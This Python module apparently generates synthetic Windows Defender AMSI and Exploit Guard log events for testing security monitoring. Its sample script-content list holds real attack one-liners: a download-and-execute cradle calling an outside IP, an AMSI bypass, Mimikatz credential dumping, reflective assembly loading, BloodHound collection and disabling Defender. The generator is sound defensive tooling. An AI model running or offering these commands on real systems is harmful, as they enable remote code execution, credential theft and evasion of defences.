from __future__ import annotations

import json
import random
import uuid
from datetime import datetime, timezone

from sources.base_source import LogEvent, LogSource, ScenarioEntities, TransportName
from utils.faker_helpers import DOMAIN, random_user, random_windows_host, weighted_choice

# AMSI detections arrive on Defender's operational channel, but they are a
# different animal from the file-based detections microsoft_defender emits:
# the "file" is in-memory script content that never touched disk, and the
# Detection Source field is what distinguishes them. 1116 is the detection,
# 1117 the action taken on it.
EVENT_IDS = [1116, 1117, 1121, 1126]
EVENT_WEIGHTS = [50, 35, 10, 5]

_EVENT_META = {
    1116: ("Microsoft Defender Antivirus has detected malware or other potentially unwanted software.", 3),
    1117: ("Microsoft Defender Antivirus has taken action to protect this machine from malware.", 4),
    1121: ("Microsoft Defender Exploit Guard has blocked an operation that is not allowed by your IT administrator.", 3),
    1126: ("Microsoft Defender Exploit Guard has blocked an operation.", 3),
}

# Threat names Defender actually reports for script-based content.
_SCRIPT_THREATS = [
    ("Trojan:PowerShell/Powersploit.M", "Severe"),
    ("Trojan:PowerShell/AmsiBypass.A", "Severe"),
    ("HackTool:PowerShell/Mimikatz.A", "Severe"),
    ("Trojan:JS/Obfuse.NBS", "High"),
    ("Trojan:VBS/Dropper.AC", "High"),
    ("Behavior:PowerShell/SuspiciousDownload.A", "Moderate"),
    ("HackTool:PowerShell/SharpHound.A", "High"),
    ("Trojan:Script/Wacatac.B!ml", "Severe"),
]

# The content AMSI actually saw — this is the value of the source: it captures
# the script after de-obfuscation, at the moment it was submitted for scanning.
_SCRIPT_CONTENT = [
    "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.9/a.ps1')",
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    "Invoke-Mimikatz -DumpCreds",
    "$b=[Convert]::FromBase64String($enc);$a=[Reflection.Assembly]::Load($b);"
    "$a.EntryPoint.Invoke($null,$null)",
    "Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip",
    "Set-MpPreference -DisableRealtimeMonitoring $true",
]

_DETECTION_SOURCES = ["AMSI", "AMSI", "AMSI", "Real-Time Protection", "Behavior monitoring"]
_PROCESSES = [
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "C:\\Windows\\System32\\wscript.exe",
    "C:\\Windows\\System32\\cscript.exe",
    "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
]
_ACTIONS = ["Quarantine", "Remove", "Block", "Allow", "No Action"]
_ACTION_WEIGHTS = [30, 20, 35, 5, 10]

_ASR_RULES = [
    ("Block all Office applications from creating child processes", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"),
    ("Block credential stealing from the Windows local security authority subsystem",
     "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2"),
    ("Block process creations originating from PSExec and WMI commands",
     "D1E49AAC-8F56-4280-B9BA-993A6D77406C"),
    ("Block executable content from email client and webmail", "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"),
]


def _build(*, event_id: int, host: str, user: str,
           threat: tuple | None = None, content: str | None = None) -> dict:
    now = datetime.now(timezone.utc)
    domain = DOMAIN.split(".")[0].upper()
    message, level = _EVENT_META[event_id]
    process = random.choice(_PROCESSES)

    if event_id in (1116, 1117):
        threat_name, severity = threat or random.choice(_SCRIPT_THREATS)
        detection_source = random.choice(_DETECTION_SOURCES)
        script = content if content is not None else random.choice(_SCRIPT_CONTENT)
        data = {
            "Product Name": "Microsoft Defender Antivirus",
            "Product Version": "4.18.24030.9",
            "Detection ID": f"{{{str(uuid.uuid4()).upper()}}}",
            "Detection Time": now.isoformat(),
            "Threat ID": str(random.randint(2147500000, 2147800000)),
            "Threat Name": threat_name,
            "Severity Name": severity,
            "Category Name": "Trojan" if "Trojan" in threat_name else "Tool",
            "FWLink": f"https://go.microsoft.com/fwlink/?linkid=37020&name={threat_name}",
            "Status": "Detected" if event_id == 1116 else "Cleaned",
            "Detection Source": detection_source,
            "Process Name": process,
            "Detection User": f"{domain}\\{user}",
            "Path": (
                # An in-memory detection has no file path -- the amsi: prefix
                # is how Defender expresses that, and it's the tell that this
                # is script content rather than a dropped file.
                f"amsi:_{process.rsplit(chr(92), 1)[-1]}"
                if detection_source == "AMSI"
                else f"file:_C:\\Users\\{user}\\AppData\\Local\\Temp\\{uuid.uuid4().hex[:8]}.ps1"
            ),
            "Origin Name": "Local machine",
            "Execution Name": "Suspended",
            "Type Name": "Concrete",
            "Signature Version": "1.409.271.0",
            "Engine Version": "1.1.24030.4",
            "Script Content": script,
        }
        if event_id == 1117:
            data["Action Name"] = weighted_choice(_ACTIONS, _ACTION_WEIGHTS)
            data["Error Code"] = "0x00000000"
            data["Error Description"] = "The operation completed successfully."
    else:
        rule_name, rule_id = random.choice(_ASR_RULES)
        data = {
            "Product Name": "Microsoft Defender Exploit Guard",
            "ID": rule_id,
            "Rule Name": rule_name,
            "Detection Time": now.isoformat(),
            "User": f"{domain}\\{user}",
            "Path": process,
            "Process Name": random.choice(_PROCESSES),
            "Target Commandline": random.choice(_SCRIPT_CONTENT)[:120],
            "Status": "Blocked",
        }

    return {
        "EventID": event_id,
        "TimeCreated": now.isoformat(),
        "Channel": "Microsoft-Windows-Windows Defender/Operational",
        "Computer": host,
        "Provider": "Microsoft-Windows-Windows Defender",
        "ProviderGuid": "11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78",
        "Level": level,
        "Task": event_id,
        "Opcode": 0,
        "Keywords": "0x8000000000000000",
        "EventRecordID": random.randint(100000, 9999999),
        "ProcessID": 4340,
        "ThreadID": random.randint(8, 4000),
        "SecurityUserID": "S-1-5-18",
        "EventData": data,
        "Message": message,
    }


class WindowsAMSISource(LogSource):
    id = "windows_amsi"
    display_name = "Windows AMSI / Exploit Guard"
    description = "Defender AMSI script detections and Exploit Guard (ASR) blocks — in-memory script content, not files"
    default_transport: TransportName = "wec"
    supported_transports = ["wec", "syslog"]
    default_eps = 2.0
    tags = ["windows", "endpoint", "amsi", "antivirus", "script"]

    async def generate(self) -> LogEvent:
        event = _build(
            event_id=weighted_choice(EVENT_IDS, EVENT_WEIGHTS),
            host=random_windows_host(),
            user=random_user(),
        )
        return LogEvent(raw=json.dumps(event), structured=event, format="windows_evtx", source_id=self.id)

    async def generate_with_entities(
        self, entities: ScenarioEntities, overrides: dict | None = None
    ) -> LogEvent:
        """Scenario mode: put the script detection on the run's host and user.

        Recognized overrides: event_id, threat_name, script_content.
        """
        overrides = overrides or {}
        # .get(key, default) -- not `or` -- so an explicit falsy override
        # (e.g. "") is honored instead of silently replaced by random data.
        wanted = overrides.get("threat_name")
        threat = next((t for t in _SCRIPT_THREATS if t[0] == wanted), None) if wanted else None
        if wanted and threat is None:
            # Honor an unlisted threat name rather than substituting a
            # different one than the scenario asked for.
            threat = (wanted, "Severe")

        event = _build(
            event_id=int(overrides.get("event_id", weighted_choice(EVENT_IDS, EVENT_WEIGHTS))),
            host=entities.host,
            user=entities.username,
            threat=threat,
            content=overrides.get("script_content"),
        )
        return LogEvent(raw=json.dumps(event), structured=event, format="windows_evtx", source_id=self.id)
